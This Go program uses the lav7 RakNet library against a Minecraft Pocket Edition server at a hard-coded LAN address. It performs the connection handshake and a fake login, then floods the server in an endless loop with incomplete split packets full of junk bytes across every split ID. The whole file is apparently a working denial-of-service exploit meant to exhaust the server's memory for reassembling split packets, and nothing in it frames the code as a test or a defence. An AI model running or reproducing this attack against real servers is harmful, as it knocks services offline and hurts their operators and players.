package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"sync"
	"time"

	"github.com/L7-MCPE/lav7"
	"github.com/L7-MCPE/lav7/raknet"
	"github.com/L7-MCPE/lav7/util/buffer"
)

var junk = make([]byte, 8191)
var ocr1 []byte
var ocr2 []byte
var handshake []byte // Cache
var target = "192.168.0.6:19132"
var ticketLock = new(sync.Mutex)
var tickets = 500

type junkSender struct {
	conn    net.Conn
	lastSeq uint32
}

func assert(err error) {
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}
}

func (j *junkSender) run() {
	var err error
	j.conn, err = net.Dial("udp", target)
	assert(err)

	go func() {
		for {
			recvBuffer := make([]byte, 1024)
			_, err = bufio.NewReader(j.conn).Read(recvBuffer)
			assert(err)
			if len(recvBuffer) >= 8 &&
				recvBuffer[0] >= 0x80 && recvBuffer[0] < 0x90 &&
				recvBuffer[4] == 0x00 && recvBuffer[7] == 0x15 {
				fmt.Println("Session is closed!")
				os.Exit(0)
			} else if recvBuffer[0] >= 0x80 && recvBuffer[0] < 0x90 {
				dp := &raknet.DataPacket{
					Buffer: buffer.FromBytes(recvBuffer),
				}
				dp.Decode()
				for _, ep := range dp.Packets {
					if ep.Buffer.Payload[0] == 0x91 {
						fmt.Println("Session is closed!")
						os.Exit(0)
						return
					}
				}
			}
		}
	}()

	j.send(ocr1)
	j.send(ocr2)
	j.send(handshake)
	j.lastSeq++
	j.sendFromFields(0x80, raknet.Fields{
		"seqNumber": j.lastSeq,
		"packets": []*raknet.EncapsulatedPacket{
			raknet.NewEncapsulated(
				func() *buffer.Buffer {
					return lav7.Login{
						Username: "Helloworld",
						Proto1:   lav7.MinecraftProtocol,
						Proto2:   lav7.MinecraftProtocol,
						ClientID: 0,
						SkinName: "WhoKnows",
						Skin:     make([]byte, 32*64*4),
					}.Write()
				}(),
			),
		},
	})
	j.lastSeq++
}

func (j *junkSender) sendFromFields(pid byte, field raknet.Fields) {
	j.send(raknet.GetHandler(pid).Write(field).Done())
	return
}

func (j *junkSender) sendDataPacket(pid byte, field raknet.Fields) {
	dp := &raknet.DataPacket{
		Head:      0x80,
		SeqNumber: j.lastSeq,
		Packets: []*raknet.EncapsulatedPacket{
			&raknet.EncapsulatedPacket{
				Buffer: raknet.GetDataHandler(pid).Write(field),
			},
		},
	}
	dp.Encode()
	j.send(dp.Done())
	j.lastSeq++
}

func (j *junkSender) sendJunkSplit(splitID uint16, splitIndex uint32) {

	dp := &raknet.DataPacket{
		Head:      0x80,
		SeqNumber: j.lastSeq,
		Packets: []*raknet.EncapsulatedPacket{
			&raknet.EncapsulatedPacket{
				HasSplit:   true,
				SplitCount: 127,
				SplitID:    splitID,
				SplitIndex: splitIndex,
				Buffer:     buffer.FromBytes(junk),
			},
		},
	}

	dp.Encode()
	j.send(dp.Done())
	j.lastSeq++
}

func (j *junkSender) send(b []byte) {
	/*
		    ticketLock.Lock()
			defer ticketLock.Unlock()
			for tickets > 0 {
				ticketLock.Unlock()
				time.Sleep(time.Millisecond * 75)
				ticketLock.Lock()
			}
	*/
	j.conn.Write(b)
}

func initCache() {
	ocr1 = raknet.GetHandler(0x05).Write(raknet.Fields{
		"protocol": uint8(raknet.RaknetProtocol),
		"mtuSize":  1464,
	}).Done()
	ocr2 = raknet.GetHandler(0x07).Write(raknet.Fields{
		"serverAddress": func() *net.UDPAddr {
			n, err := net.ResolveUDPAddr("udp", target)
			assert(err)
			return n
		}(),
		"mtuSize":  uint16(1464),
		"clientID": uint64(483287947),
	}).Done()
	dp := &raknet.DataPacket{
		Head:      0x80,
		SeqNumber: 0,
		Packets: []*raknet.EncapsulatedPacket{
			&raknet.EncapsulatedPacket{
				Buffer: raknet.GetDataHandler(0x13).Write(raknet.Fields{
					"address": new(net.UDPAddr),
					"systemAddresses": func() []*net.UDPAddr {
						r := make([]*net.UDPAddr, 10)
						for i := 0; i < 10; i++ {
							r[i] = new(net.UDPAddr)
						}
						return r
					}(),
					"sendPing": uint64(324324),
					"sendPong": uint64(324325),
				}),
			},
		},
	}
	dp.Encode()
	handshake = dp.Done()
}

func main() {
	raknet.InitProtocol()
	initCache()
	sender := new(junkSender)
	go func() {
		ticker := time.NewTicker(time.Millisecond * 50)
		for _ = range ticker.C {
			ticketLock.Lock()
			tickets = 500
			ticketLock.Unlock()
		}
	}()
	sender.run()
	for {
		for splitID := uint16(0); splitID <= 65535; splitID++ {
			for splitIndex := uint32(0); splitIndex < 126; splitIndex++ {
				sender.sendJunkSplit(splitID, splitIndex)
				time.Sleep(time.Millisecond * 5)
			}
		}
		for splitID := uint16(0); splitID <= 65535; splitID++ {
			sender.sendJunkSplit(splitID, 126)
		}
	}
}
